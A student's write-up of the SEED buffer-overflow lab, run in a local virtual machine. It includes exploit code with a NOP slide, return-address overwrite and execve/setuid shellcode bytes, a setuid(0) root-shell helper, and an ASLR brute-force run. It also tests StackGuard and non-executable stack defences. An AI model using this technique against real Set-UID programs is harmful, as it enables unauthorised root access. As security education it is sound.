---
title: Laboration 1 - Buffer Overflow
---

[Lab description](https://seedsecuritylabs.org/Labs_16.04/PDF/Buffer_Overflow.pdf)

## Environment & preparations
The provided SEED lab environment was used, which is a preconfigured virtual machine image running a 32-bit version of Ubuntu 16.04. It is being run in VirtualBox on a 64-bit Linux host.

To begin with the lab, the following commands were executed as provided in the lab document, in order to disable some security measures. These will later be reenabled throughout the lab.

Disable Address Space Randomisation (ASLR):

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

The default POSIX-compatible shell that is available at `/bin/sh` in the lab environment points to the Dash shell, which contains a countermeasure for Set-UID privilege escalation which will be demonstrated in the lab. Instead of using Dash, we will be instead pointing the symlink to Zsh which does not offer this countermeasure:

```bash
sudo ln -sf /bin/zsh /bin/sh
```

The lab description also describes some useful compiler flags for GCC that will be used to disable certain security measures that may hinder the ability to demonstrate buffer overflow vulnerabilities:

- `-fno-stack-protector` - Disables StackGuard in the GCC compiler, used for protecting against buffer overflows in the satck
- `-z execstack` - Makes the stack executable in the linked executable (default is noexec)

## Task 1: Running shellcode
The first program that we are provided in the task description is `call_shellcode.c` which is used to demonstrate being able to run arbitrary machine code. An example payload is provided in `code` which will run a new `/bin/sh` shell using execve (so-called shellcode, as it starts a shell). It is then copied into a variable `buf` using `strcpy` and executed like a function.

Compiling the program as such, making the stack executable:

```bash
gcc -z execstack -o call_shellcode call_shellcode.c
```

...And then running the produced executable gives us a new shell, running under the same user.

```bash
seed@VM:~/.../lab1$ whoami
seed
seed@VM:~/.../lab1$ ./call_shellcode
$ whoami
seed
```

Worth noting that when compiling the program without `execstack` (meaning `noexecstack`) and running it will create a segmentation fault, triggered by trying to execute the code on the stack that has been marked as not executable.

```bash
seed@VM:~/.../lab1$ gcc -o call_shellcode call_shellcode.c
seed@VM:~/.../lab1$ ./call_shellcode
Segmentation Fault
```

Another program `stack.c` is provided to us in the task description, which contains a buffer overflow due the function `bof()` being passed the argument `str` which is longer than the length of `buffer`, which is being copied to using the unsafe `strcpy` function.

(Worth noting that if you wanted to fix this, one would want to use `strncpy`, alternatively BSD's `strlcpy` or Windows' `strcpy_s` which performs bounds checking using a new argument for the maximum length of the destination. E.g. `strncpy(buffer, str, BUF_SIZE-1)` with `strncpy` will limit the amount being copied to the length of the destination buffer, making sure that the end of it is terminated by making the length one less than the buffer's total length.)

It is compiled with an executable stack and with the stack protector disabled, just to make it even more insecure:

```bash
gcc -DBUF_SIZE=57 -o stack -z execstack -fno-stack-protector stack.c
```

Then the resulting executable file has its owner changed to root and the Set-UID bit is enabled, while setting the file permission to 755 so everyone can read and execute it.

```bash
sudo chown root stack
sudo chmod 4755 stack
```

We're already using root permissions here to make the executable owned by root, and set its UID to root when run by anyone, but outside of this simulated lab scenario it would be that we are on a system without root permissions, but have a program that sets its UID to root when running (e.g. `passwd`) with a known buffer overflow vulnerability.

## Task 2: Exploiting the vulnerability
Using the vulnerable program compiled and prepared in Task 1, we will utilise the vulnerability to execute arbitrary code, allowing us to get a root shell in combination with the Set-UID permission bit for the executable.

The start for a C program that will write our payload to a file is provided, as `exploit.c`. All that is missing is to copy the contents of `code` at the end of the 517 byte buffer that is written to file, and replacing the return address somewhere along the NOP slide (the rest of the file contains 0x90 NOP instructions).

To copy the code to the end of the buffer:

```c
for (size_t i = 0; i < sizeof(code); i++) {
	buffer[517 - sizeof(code) + i] = code[i];
}
```

Compiling `exploit.c` just as it is now and running it writes a `badfile` file with just the code at the end. Running the vulnerable `stack` program right now simply gives a segmentation fault, as there isn't a return address crafted yet (it will read the NOP instructions as an address, which results in garbage). If we run it with GDB (while removing the setuid flag) then we can see that the EIP (instruction pointer) register is 0x90909090 which means that the buffer overflow does indeed work.

Looking at the stack that GDB shows when the segmentation fault also shows the memory address at which the payload is placed, with ESP being at 0xbfffe990. The address 0xbfffe9ff is picked, which should be in the NOP slide and end up at the payload. As the size of the buffer we are overflowing is 57 bytes, the location of the return address would be somewhere after that. Past the end of the buffer, eight copies of the memory address is written, one of which is very likely going to be the location in the stack that is used for the return address.

```c
int offset = 57/*BUF_SIZE*/;
// 0xbfffe9ff
for (int i = 0; i < 8; i++) {
	buffer[offset+0+(i*4)] = 0xff;
	buffer[offset+1+(i*4)] = 0xe9;
	buffer[offset+2+(i*4)] = 0xff;
	buffer[offset+3+(i*4)] = 0xbf;
}
```

The final exploit file ends up looking like this when viewed through `xxd`:

```bash
seed@VM:~/.../lab1$ gcc -o exploit exploit.c
seed@VM:~/.../lab1$ ./exploit
seed@VM:~/.../lab1$ xxd badfile
[...]
00000030: 9090 9090 9090 9090 90ff e9ff bfff e9ff  ................
00000040: bfff e9ff bfff e9ff bfff e9ff bfff e9ff  ................
00000050: bfff e9ff bfff e9ff bf90 9090 9090 9090  ................
[...]
000001e0: 9090 9090 9090 9090 9090 9090 31c0 5068  ............1.Ph
000001f0: 2f2f 7368 682f 6269 6e89 e350 5389 e199  //shh/bin..PS...
00000200: b00b cd80 00
```

Once the final `badfile` is generated, `stack` is again run and now a root shell appears, signified by the hash sign rather than a dollar sign.

```bash
seed@VM:~/.../lab1$ ./stack
#
```

However, as mentioned in the task instructions, when compromising a Set-UID flagged program and starting a shell from it, the effective user ID becomes root but your real user ID remains yourself.

```bash
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed), [...]
```

Comparing against what running `id` with proper root elevation with `sudo`:

```bash
seed@VM:~/.../lab1$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```

In order to turn the `uid` to root, we simply need to write and compile a program that runs `setuid(0)` and launches a new shell (in the regular shell since GCC does not seem to like the effectively elevated shell we got). Then rerun the vulnerable program to get the root shell, run the setuid program and the `uid` is now actually root.

```bash
seed@VM:~/.../lab1$ echo 'void main() { setuid(0); system("/bin/sh"); }' > gimmie_root.c
seed@VM:~/.../lab1$ gcc gimmie_root.c -o gimmie_root
seed@VM:~/.../lab1$ ./stack
# ./gimmie_root
# id
uid=0(root) gid=1000(seed) groups=1000(seed), [...]
```

Full root access has been achieved.

## Task 3: Defeating dash's countermeasure
The countermeasure that Dash implements is basically to check if the effective UID and real UID mismatches, as occurred when we first got the root shell without running the second program in it.

Let's revert the symlink to point `/bin/sh` to `/bin/dash` again:

```bash
sudo ln -sf /bin/dash /bin/sh
```

The `dash_shell_test.c` program is provided in the task description which contains another simple program that will launch `/bin/sh` using `execve`. But this time there is a commented out line for setuid above execve.

```c
// setuid(0);
```

Compiling the program as-is and then setting the same ownership by root and enabling the Set-UID bit, then running it will show that Dash resets our UID to the regular `seed` user, and no root access is provided.

```bash
seed@VM:~/.../lab1$ gcc dash_shell_test.c -o dash_shell_test
seed@VM:~/.../lab1$ sudo chown root dash_shell_test
seed@VM:~/.../lab1$ sudo chmod 4755 dash_shell_test
seed@VM:~/.../lab1$ ./dash_shell_test
$ whoami
seed
```

However, uncommenting the before mentioned setuid line and recompiling, then running it again will show that the shell is now root.

```bash
seed@VM:~/.../lab1$ gcc dash_shell_test.c -o dash_shell_test
seed@VM:~/.../lab1$ sudo chown root dash_shell_test
seed@VM:~/.../lab1$ sudo chmod 4755 dash_shell_test
seed@VM:~/.../lab1$ ./dash_shell_test
# whoami
root
```

Going back to the `exploit.c` file from Task 2, we can add the equivalent to `setuid` in machine code, calling the necessary system call with an argument of zero.

```c
const char code[] =
	"\x31\xc0"
	"\x31\xdb"
	"\xb0\xd5"
	"\xcd\x80"
	(...same payload below here...)
```

Redoing the attack from Task 2 with the newly added code, generating a new payload file and running the vulnerable `stack` program, we get a root shell again:

```bash
seed@VM:~/.../lab1$ ./stack
# whoami
root
```

We've once again managed to elevate from a regular user to the root user with access to a vulnerable Set-UID binary, this time in Dash.

## Task 4: Defeating Address Randomisation
ASLR or Address Randomisation means that the address space of programs get randomised, so that the strategy used above will not work as the memory address we need to jump to will be wildly different every time. However the task description mentions that on 32-bit Linux machines, the entropy is low enough that it can be brute forced (2^19 = 524 288 possibilities).

Let's enable ASLR, which was previously disabled for preparation:

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

Then the `bruteforce.sh` Bash script that is provided in the task description is run. It will repeatedly try to run the vulnerable `stack` program in a loop, repeating until we will get a shell. If the address layout is mismatched, it will segfault, but if it coincidentally matches then a root shell is acquired:

```bash
1 minutes and 14 seconds elapsed.
The program has been running 99200 times so far.
./bruteforce.sh: line 13:  5521 Segmentation fault        ./stack
1 minutes and 14 seconds elapsed.
The program has been running 99201 times so far.
#
```

After it has run the vulnerable program a little under 100 000 times, a root shell appears.

## Task 5: Turn on the StackGuard Protection
ASLR is once again disabled, to reduce potential interference when testing other types of protection schemes:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

`stack` is recompiled with StackGuard protection enabled (the default in GCC 4.3.3+ when omitting `-fno-stack-protector`).

```bash
seed@VM:~/.../lab1$ gcc -DBUF_SIZE=57 -o stack -z execstack stack.c
seed@VM:~/.../lab1$ ./stack
*** stack smashing detected ***: ./stack terminated
Aborted
```

The program prints that a stack smash, the name of an attack that exploits a stack buffer overflow vulnerability, is detected and then aborts before anything bad happens.

## Task 6: Turn on the Non-executable Stack Protection
While ASLR still off, we disable the StackGuard protection again but this time compile with `noexecstack`. It will segfault when run:

```bash
seed@VM:~/.../lab1$ gcc -DBUF_SIZE=57 -o stack -fno-stack-protector -z noexecstack stack.c
seed@VM:~/.../lab1$ ./stack
Segmentation Fault
```

Running the program through GDB shows that the stack smash still works, but that once we've jumped to the NOP slide and try to execute an operation there, SIGSEGV is raised since this is memory that is now marked as non-executable.

```
   0xbfffe9fe:  nop
=> 0xbfffe9ff:  nop
   0xbfffea00:  nop
```

The task description mentions that whether this works depends on the configuration of the virtual machine and the support of the host CPU. The so-called "NX-bit" for marking pages of memory as non-executable was introduced around the time of AMD's 64-bit processors, and as the laboration is being done on a computer with a modern Ryzen processor, it of course supports this.

Going into the VirtualBox settings for the lab's virtual machine, Settings (Expert) -> General -> Processor -> Extended Features has a checkbox called "Enable PAE/NX" which is ticked, meaning that the virtual machine will have access to this feature of the processor.

It would be assumed that unticking it would mean that the attack would once again work even if the program is compiled with `noexecstack`, since the virtualised guest environment would assume it is not supported. However attempting to untick this checkbox causes a Guru Meditation critical error in Virtualbox when booting up the VM.
